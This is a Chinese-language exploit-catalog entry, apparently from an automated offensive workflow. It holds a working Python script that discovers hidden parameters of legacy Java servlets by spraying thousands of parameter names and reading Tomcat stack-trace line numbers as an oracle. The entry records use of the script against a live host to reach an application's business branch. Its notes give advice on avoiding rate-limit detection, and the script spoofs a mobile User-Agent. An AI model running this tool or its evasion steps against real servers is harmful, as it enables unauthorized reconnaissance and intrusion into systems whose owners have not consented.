# 老式 Java servlet「分块灌参 + 栈行号二分收敛」参数发现法（Tomcat 报错栈当 oracle）

- **code**: 老式-java-servlet-分块灌参-栈行号二分收敛-参数发现法-tomcat-报错栈当-oracle
- **kind**: script
- **category**: info-leak
- **component**: 老式 Java Servlet（Tomcat 默认错误页 + Integer.parseInt 型参数）
- **severity**: medium
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 在 203.0.113.56:80 上实测：/LHService/gettk 用此法定出 type→userid→getsc→tk_lv 四级参数并拿到 200 响应（{"sc_tk":"","tk_lv":14,"tk_list_json":"[...]"}）；/LHService/json 用同法定出 type 并据此判死会话校验。原始日志：work/exploit8/s17_out.txt、s19_out.txt、s20_out.txt、s23_out.txt、s24_out.txt
- **path**: pocs/老式-java-servlet-分块灌参-栈行号二分收敛-参数发现法-tomcat-报错栈当-oracle/servlet_param_delta.py
- **tags**: java,servlet,参数爆破,tomcat,栈泄露,delta,二分
- **created_at**: 2026-10-11T12:26:55.215Z
- **found_by**: exploit

## 描述

用途：对「只做 Integer.parseInt / getParameter、缺参就抛异常，且 Tomcat 把完整栈回显到页面」的老 servlet，在**不知道参数名**的情况下逐级把它的参数集开出来，直到能进业务分支。

原理：这类 servlet 的 `getParameter(x)` 返回 null 时 `Integer.parseInt(null)` 抛 NumberFormatException，Tomcat 错误页 `<pre>` 里会带**类名 + 行号**。每喂对一个必需参数，执行流就往后走一行 ⇒ **行号变化 = 参数命中**。于是把参数发现问题变成「二分收敛行号」。

判据：`GetXxx.java:<行号>`；行号变化=命中；变成非 500（200/业务串）= 已进入业务分支。

在本靶标实测战绩：
· /LHService/gettk (example.com.Service2_8.GetTk)：44 → +type=1 → 45 → +userid → 51 → +getsc → 57 → +tk_lv → **200**
· /LHService/json (example.com.Service_2015.GetJsonServlet)：31 → +type=1 → 44 ⇒ 第二级零变化，判定 :44 是**会话校验**（非缺参）⇒ 不是未认证 SSRF
· /LHService/register18：用同法命中 `flag`（旧法：34491 参数名分批灌，值全 1）

限制/注意：① 每级要重灌一轮（1500/块 × 23 块 ≈ 23 请求），必须单线程 + 间隔 ≥0.6s，否则被判频控；② 值要给能通过 `parseInt` 的（如 `1`）；③ 若栈不显示（生产关栈）此法失效，改用参数名差异法。

## 用法

```
1) 先取基线：POST/GET 目标 servlet 带一个无关参数（如 zz=1），记下错误页里的 `Xxx.java:<行号>` L0
2) 灌参：把候选参数名表（本靶标用 work/exploit/paramword.txt，34491 个）按 1500 个一块拼成 `p1=1&p2=1&...` POST 上去，逐块对比行号，找出行号 != L0 的块
3) 二分：在命中的块内二分，收敛到**单个**参数名 p
4) 验证：单发 `p=1`，行号应再前进（或变 200）
5) 把 p 加入前缀，回到第 2 步继续下一级，直到 200 或行号不再变化（不再变化 ⇒ 该行不是缺参，多半是缺 session/attribute）
6) 完整脚本见 work/exploit8/s19_gettk4.py、s24_json2.py；参数表 work/exploit/paramword.txt
```

## 正文

```
# -*- coding: utf-8 -*-
"""老式 Java servlet 参数发现：分块灌参 + Tomcat 栈行号二分收敛。

用法：
    python servlet_param_delta.py <host> <port> <path> [params_file] [method]
例：
    python servlet_param_delta.py 203.0.113.56 80 /LHService/gettk work/exploit/paramword.txt POST

依赖：仅标准库（socket / re / time）。**不要用 requests/curl**：本机 http_proxy 会污染。
"""
import socket, re, sys, time, os

UA = ('Mozilla/5.0 (Linux; Android 13; 23013RK75C) AppleWebKit/537.36 '
      '(KHTML, like Gecko) Chrome/203.0.113.52 Mobile Safari/537.36')
CHUNK = 1500
DELAY = 0.7


def call(host, port, path, body, method='POST', read_ms=9000):
    s = None
    try:
        s = socket.create_connection((host, port), timeout=9)
        h = {'Host': host, 'User-Agent': UA, 'Accept-Encoding': 'identity',
             'Connection': 'close', 'Content-Type': 'application/x-www-form-urlencoded',
             'Content-Length': str(len(body.encode()))}
        s.sendall((method + ' ' + path + ' HTTP/1.1\r\n' +
                   ''.join(f'{k}: {v}\r\n' for k, v in h.items()) + '\r\n').encode() + body.encode())
        buf = b''
        s.settimeout(read_ms / 1000.0)
        while True:
            try:
                c = s.recv(65536)
            except Exception:
                break
            if not c:
                break
            buf += c
            if len(buf) > 400000:
                break
    except Exception as e:
        return -1, 'ERR ' + type(e).__name__
    finally:
        try:
            if s:
                s.close()
        except Exception:
            pass
    hdb, _, bb = buf.partition(b'\r\n\r\n')
    try:
        st = int(hdb.split(b'\r\n')[0].split()[1])
    except Exception:
        st = -1
    if b'transfer-encoding: chunked' in hdb.lower():
        out, rest = b'', bb
        while True:
            i = rest.find(b'\r\n')
            if i < 0:
                break
            try:
                n = int(rest[:i].split(b';')[0], 16)
            except Exception:
                break
            if n == 0:
                break
            out += rest[i + 2:i + 2 + n]
            rest = rest[i + 2 + n + 2:]
        bb = out
    t = bb.decode('utf-8', 'replace')
    m = re.search(r'<pre>(.*?)</pre>', t, re.S)
    if m:
        return st, ' | '.join(x.strip() for x in m.group(1).strip().split('\n')[:3])
    return st, t.replace('\n', ' ')[:300]


def sig(txt, cls):
    m = re.search(re.escape(cls) + r'\.java:(\d+)', txt)
    return 'L' + m.group(1) if m else 'BODY:' + re.sub(r'\s+', ' ', txt)[:140]


def main():
    host, port, path = sys.argv[1], int(sys.argv[2]), sys.argv[3]
    pfile = sys.argv[4] if len(sys.argv) > 4 else r'work\exploit\paramword.txt'
    method = sys.argv[5] if len(sys.argv) > 5 else 'POST'
    params = [l.strip() for l in open(pfile, encoding='utf-8', errors='replace') if l.strip()]
    st, t = call(host, port, path, 'zz=1', method)
    m = re.search(r'([\w.]+Servlet|GetTk|Get\w+)\.java:(\d+)', t)
    cls = m.group(1) if m else 'X'
    base = sig(t, cls)
    print(f'基线 {st} {base} | {t[:180]}')
    prefix = ''
    for round_ in range(5):
        hits = []
        for i in range(0, len(params), CHUNK):
            ch = params[i:i + CHUNK]
            st, t = call(host, port, path, (prefix + '&' if prefix else '') + '&'.join(p + '=1' for p in ch), method)
            if sig(t, cls) != base:
                hits.append((i, i + len(ch)))
                print(f'  ★ round{round_} chunk {i}-{i+len(ch)} -> {sig(t, cls)}')
            time.sleep(DELAY)
        if not hits:
            print('  本轮无命中 ⇒ 该行多半是缺 session/attribute，不是缺参数。停。')
            break
        a, b = hits[0]
        lo, hi = a, b
        while hi - lo > 1:
            mid = (lo + hi) // 2
            st, t = call(host, port, path, (prefix + '&' if prefix else '') + '&'.join(p + '=1' for p in params[lo:mid]), method)
            if sig(t, cls) != base:
                hi = mid
            else:
                lo = mid
            time.sleep(DELAY)
        nm = params[lo]
        prefix = (prefix + '&' if prefix else '') + nm + '=1'
        st, t = call(host, port, path, prefix, method)
        base = sig(t, cls)
        print(f'  ** 收敛参数: {nm} ⇒ 前缀 {prefix} -> {st} {base} | {t[:220]}')
        if st == 200:
            print('  已进入业务分支，继续按需给真实值。')
            break


if __name__ == '__main__':
    main()

```
